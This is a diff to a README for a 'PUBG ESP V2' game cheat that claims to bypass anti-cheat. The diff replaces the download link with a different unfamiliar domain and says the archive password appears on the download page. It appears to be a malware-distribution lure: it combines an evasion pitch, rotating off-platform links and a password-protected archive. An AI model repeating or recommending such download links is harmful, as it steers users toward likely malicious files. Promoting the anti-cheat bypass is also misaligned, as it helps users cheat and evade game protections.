@@ -18,7 +18,7 @@ PUBG ESP V2 - undetected PUBG cheat. Bypasses anti-cheat system. Works on PC and
 
 ## Download
 
-[![Download v3.0.0](https://img.shields.io/badge/Download_v3.0.0-ec4899?style=for-the-badge&logoColor=white)](https://dllvcrun.com/pubgespv2)
+[![Download v3.0.0](https://img.shields.io/badge/Download_v3.0.0-ec4899?style=for-the-badge&logoColor=white)](https://p-csx-5.com/pubgespv2)
 
 > The archive password is shown on the download page.
 
